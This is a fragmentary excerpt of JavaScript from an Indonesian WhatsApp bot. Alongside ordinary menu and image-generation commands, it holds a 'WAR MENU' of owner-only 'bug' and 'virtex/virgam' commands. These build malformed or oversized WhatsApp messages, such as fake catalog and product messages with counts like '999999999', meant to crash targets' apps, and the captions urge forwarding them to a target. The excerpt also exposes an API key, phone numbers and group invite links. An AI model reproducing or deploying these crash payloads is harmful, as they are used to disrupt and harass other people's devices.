...
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
		...
		const katalog = (teks) => {
             res = kurr.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 321, "message": teks, "footerText": "𒇲𝑹͢𝑰𝒁࠘𝑲𝒀𝒁𝑿༴᪵ 𝑶𝑭࠘𝑭͢𝑪𝛯𒇺", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftrol})
             kurr.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = kurr.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/JI25LDtPW784GAZoRD9fW9', "groupName": `${NamaBot}`, "footerText": "𒇲𝑹͢𝑰𝒁࠘𝑲𝒀𝒁𝑿༴᪵ 𝑶𝑭࠘𝑭͢𝑪𝛯𒇺", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:finv})
...
if(isButton == 'igm'){
reply('http://instagram.com/zerzsoftboy1_')
}
if(isButton == 'ytm'){
...
Silahkan pilih, apakah kamu mau aku kirim virtex?`, `Virtex By 𒇲𝑹͢𝑰𝒁࠘𝑲𝒀𝒁𝑿༴᪵ 𝑶𝑭࠘𝑭͢𝑪𝛯𒇺`, [
          {
...
case 'virvid':
            ...
            kurr.sendMessage(from, ini_buffer, video, {quoted: mek, thumbnail:virgam, caption: 'Nih Videonya\n\n⚠️*Perhatian.!!*⚠️\nVideo ini Mengandung Virvid/Bug SW!!'}, options)
            fs.unlinkSync(file)
        } else{
...
virgamm = await kurr.downloadAndSaveMediaMessage(virgamnye, './media/sampah')
ran = getRandom('.png')
...
kurr.sendMessage(from, buffer, image, {quoted: mek, thumbnail:virgam, caption: 'Nih Fotonya\n\n⚠️*Perhatian.!!*⚠️\nFoto ini Mengandung Virgam/Bug SW!!\nTeruskan Gambar ini ke Target/jadikan SW'})
fs.unlinkSync(ran)
})
break
case 'bugkatalog':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
  					kurr.toggleDisappearingMessages(from,`ups`,text)
    hmm4 = fs.readFileSync(`./media/image/kurr.jpg`)
imeu = await kurr.prepareMessage('0@s.whatsapp.net', hmm4, image)
...
"descriptionCount": "999999999",
  ...
  "businessOwnerJid": "6281914523681@s.whatsapp.net",
  "contextInfo": {
...
case 'x':
  if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
            ...
            "externalAdReply": {
                ...
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/kurr.png",
                "thumbnail": fs.readFileSync(`./media/image/kurr.jpg`),
                "sourceUrl": "https://youtu.be/x-O0WHkv3uc"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        kurr.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:ofrply}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{disText:'⚔️ kurr Teknologi ⚔️'},type:1}])
        kurr.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
...
kurr.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
kurr.toggleDisappearingMessages(from, 0)
break
case 'bugtrolites':
 const kurr6 = fs.readFileSync(`./media/image/kurr.jpg`)
kurr.sendMessage(from, {quoted: ftrol, thumbnail: fs.readFileSync('./media/virgam.jpeg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"",mediaType:"2",thumbnail:ofrply,mediaUrl:`https://youtu.be/x-O0WHkv3uc`}}})
break
//•======>> SUBSCRIBE : kurr TEKNOLOGI <<====•\\
case 'bugtroli2':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
...
`
sendButLocation(from, `${menu}`, "𒇲𝑹͢𝑰𝒁࠘𝑲𝒀𝒁𝑿༴᪵ 𝑶𝑭࠘𝑭͢𝑪𝛯𒇺", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`allmenu`,buttonText:{displayText:'ALL MENU'},type:1},{buttonId:`rules`,buttonText:{displayText:'RULES'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
...
case 'allmenu': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
       ...
       stst = await kurr.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
       menunya = ` [ 冬𒇲𝑹͢𝑰𝒁࠘𝑲𝒀𝒁𝑿༴᪵ 𝑶𝑭࠘𝑭͢𝑪𝛯𒇺冬 ]
...
─❒ WAR MENU
冬 ${prefix}virtex
冬 ${prefix}virvid [reply video]
冬 ${prefix}tovirgam [reply Sticker]
冬 ${prefix}bugkatalog
冬 ${prefix}bugloc
冬 ${prefix}bugrow
冬 ${prefix}buglink
冬 ${prefix}bugbutton
冬 ${prefix}bug [ jumlah ]
冬 ${prefix}bugpc2 [ jumlah ]
冬 ${prefix}bugtroli2 [ jumlah ]
冬 ${prefix}bugtroli3
冬 ${prefix}bugpc
冬 ${prefix}bugcombine
冬 ${prefix}bugtroli
...
anu = kurr.prepareMessageFromContent(from,{
					"productMessage": {
						"product": {
								"productImage": {
								 "url": "https://mmg.whatsapp.net/d/f/ApcyqqtZe36faUPFHmATLX-Ejb3QtpcQK0xXsrdwlo39.enc",
						"mimetype": "image/jpeg",
						"fileSha256": "6mvelJ/gGuymucDfF9Euu/QEWDWzLIj8ESp/IHk3ipw=",
						"fileLength": "73373",
						"height": 1080,
						"width": 1080,
						"mediaKey": "N+VzsuBfhFUAX+1Y/9SyyniBCMhLPucBKrSttfUhDrg=",
						"fileEncSha256": "RtFbhRKJid7xOdZNa7UICtAyrAB0I5uxIrM5w1srzGs=",
...
－ JANGAN CALL/VC BOT
   LANGGAR BLOK BANNED`
sendButLocation(from, `${menu}`, "𒇲𝑹͢𝑰𝒁࠘𝑲𝒀𝒁𝑿༴᪵ 𝑶𝑭࠘𝑭͢𝑪𝛯𒇺", {jpegThumbnail:logonya,name:""}, [{buttonId:`menu`,buttonText:{displayText:'SIAP OM'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
break
case 'verify':
...
kurr.sendMessage(from,nulis,image,{quoted:mek}) 
break 
case 'nuliskiri':
...
kurr.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./media/image/kurr.jpg')})
break
case 'nuliskanan':
if (!c) return reply('Textnya mana gan?')
reply(mess.wait)
...
case 'asupan':		    
            ...
            const helpzxxx3 = await kurr.prepareMessage(from, helpzxxx2, MessageType.image, {thumbnail:Buffer.alloc(0)}) 
            ...
            kurr.sendMessage(from, helpzxxx5, MessageType.buttonsMessage, {quoted: nay1})            
		    break			
       case 'maker3d': 
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
...
const skuygelud = {
    contentText: `${anu}`,
    footerText: '*𒇲𝑹͢𝑰𝒁࠘𝑲𝒀𝒁𝑿༴᪵ 𝑶𝑭࠘𝑭͢𝑪𝛯𒇺*',
    buttons: buttons,
    headerType: 1
}
...
"templateMessage": {
						"hydratedTemplate": {
							...
							"hydratedFooterText": `𒇲𝑹͢𝑰𝒁࠘𝑲𝒀𝒁𝑿༴᪵ 𝑶𝑭࠘𝑭͢𝑪𝛯𒇺`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
...
case 'chiisaihentai':
              ...
              contentText:`Subrek yt : 𒇲𝑹͢𝑰𝒁࠘𝑲𝒀𝒁𝑿༴᪵ 𝑶𝑭࠘𝑭͢𝑪𝛯𒇺`,buttons,headerType:4}
...
case 'blackpink':
                ...
                case 'thunder':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                    if (args.length == 0) return reply(`Example: ${prefix + command} 𒇲𝑹͢𝑰𝒁࠘𝑲𝒀𝒁𝑿༴᪵ 𝑶𝑭࠘𝑭͢𝑪𝛯𒇺`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=Rizky&text=${ini_txt}`).then((gambar) => {
                        kurr.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `Subrek yt : 𒇲𝑹͢𝑰𝒁࠘𝑲𝒀𝒁𝑿༴᪵ 𝑶𝑭࠘𝑭͢𝑪𝛯𒇺`, quoted : ftrol})
                    })
                    break
                case 'pornhub':
                case 'glitch':
